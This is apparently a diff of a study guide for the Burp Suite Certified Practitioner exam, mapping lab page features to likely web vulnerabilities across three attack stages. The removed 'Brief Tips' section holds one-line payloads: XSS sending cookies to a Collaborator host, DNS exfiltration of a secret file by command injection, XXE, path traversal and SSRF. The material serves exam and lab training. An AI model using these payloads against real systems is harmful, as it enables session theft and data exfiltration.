@@ -1,45 +1,3 @@
-## Brief Tips
-
-### XSS
-```html
-<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
-```
-
-### Command Injection (DNS Exfiltration)
-```bash
-||nslookup $(cat /home/carlos/secret).burp.oastify.com||
-```
-
-### Path Traversal
-```
-../../../home/carlos/secret
-```
-
-### SSTI Detection
-```
-{{7*7}}
-```
-
-### XXE
-```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
-<stockCheck><productId>&xxe;</productId></stockCheck>
-```
-
-### SSRF
-```
-http://localhost:6566/home/carlos/secret
-```
-
-## Remember
-
-- Always use **Burp Collaborator** for out-of-band attacks
-- **DNS exfiltration** is most reliable for command injection
-- **SQLMap** with `--level 5 --risk 3` for SQL injection
-- **Burp Scanner** finds most vulnerabilities automatically
-
-
-
 # Stage 1 - anonymous to user session
 ## Possible Cases
 | Case      | Probable exploit |
@@ -49,6 +7,8 @@ http://localhost:6566/home/carlos/secret
 | Post a comment | HTTP Request Smuggling |
 | Different message error when resetting password | Bruteforce | 
 | None of the above | Bruteforce |
+## Tips
+https://github.com/DaddyBigFish/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/stage-1.md
 
 
 # Stage 2 - user to administrator session
@@ -61,6 +21,8 @@ http://localhost:6566/home/carlos/secret
 | Different message error when resetting password | Bruteforce | 
 | JSON request when updating email with answer contained "id" but not in the request | IDOR |
 | Able to remove the parameter csrf when updating the email | CSRF |
+## Tips
+https://github.com/DaddyBigFish/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/stage-2.md
 
 
 # Stage 3 - command execution as administrator
@@ -73,6 +35,8 @@ http://localhost:6566/home/carlos/secret
 | An example of template for reset email | SSTI | 
 | Download a file for report | SSRF |
 | Lots of images and no size parameter | Directory traversal |
+## Tips
+https://github.com/DaddyBigFish/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/stage-3.md
 
 
 # [1] XSS DOM Based
